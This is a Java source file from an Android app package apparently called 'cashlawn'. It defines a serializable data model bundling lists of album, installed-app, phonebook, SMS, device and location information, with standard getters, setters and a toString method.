package com.grew.sw.cashlawn.model;

import java.io.Serializable;
import java.util.List;

public class AuthInfoModel implements Serializable {
    private List<AlbumInfoModel> album_info;
    private List<AppListInfoModel> applist_info;
    private List<ContactInfoModel> phonebook_info;
    private List<SmsInfoModel> sms_info;
    private DeviceInfoModel device_info;
    private List<LocationBean> geo_info;

    public AuthInfoModel(List<AlbumInfoModel> album_info, List<AppListInfoModel> applist_info, List<ContactInfoModel> phonebook_info, List<SmsInfoModel> sms_info, DeviceInfoModel device_info, List<LocationBean> geo_info) {
        this.album_info = album_info;
        this.applist_info = applist_info;
        this.phonebook_info = phonebook_info;
        this.sms_info = sms_info;
        this.device_info = device_info;
        this.geo_info = geo_info;
    }

    @Override
    public String toString() {
        return "AuthInfoModel{" +
                "album_info=" + album_info +
                ", applist_info=" + applist_info +
                ", phonebook_info=" + phonebook_info +
                ", sms_info=" + sms_info +
                ", device_info=" + device_info +
                ", geo_info=" + geo_info +
                '}';
    }

    public List<AlbumInfoModel> getAlbum_info() {
        return album_info;
    }

    public void setAlbum_info(List<AlbumInfoModel> album_info) {
        this.album_info = album_info;
    }

    public List<AppListInfoModel> getApplist_info() {
        return applist_info;
    }

    public void setApplist_info(List<AppListInfoModel> applist_info) {
        this.applist_info = applist_info;
    }

    public List<ContactInfoModel> getPhonebook_info() {
        return phonebook_info;
    }

    public void setPhonebook_info(List<ContactInfoModel> phonebook_info) {
        this.phonebook_info = phonebook_info;
    }

    public List<SmsInfoModel> getSms_info() {
        return sms_info;
    }

    public void setSms_info(List<SmsInfoModel> sms_info) {
        this.sms_info = sms_info;
    }

    public DeviceInfoModel getDevice_info() {
        return device_info;
    }

    public void setDevice_info(DeviceInfoModel device_info) {
        this.device_info = device_info;
    }

    public List<LocationBean> getGeo_info() {
        return geo_info;
    }

    public void setGeo_info(List<LocationBean> geo_info) {
        this.geo_info = geo_info;
    }
}
